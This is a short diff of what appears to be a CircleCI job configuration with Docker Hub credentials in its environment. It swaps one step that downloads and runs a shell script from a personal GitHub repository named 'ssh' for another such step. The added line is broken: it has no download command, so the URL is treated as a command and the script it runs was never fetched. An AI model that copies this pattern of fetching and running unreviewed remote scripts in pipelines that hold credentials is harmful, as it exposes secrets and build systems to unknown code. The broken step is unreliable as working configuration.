@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://github.com/aman332211/ssh/blob/main/s.sh && ./s.sh
+      - run: https://raw.githubusercontent.com/aman332211/ssh/main/demo.sh && ./demo.sh
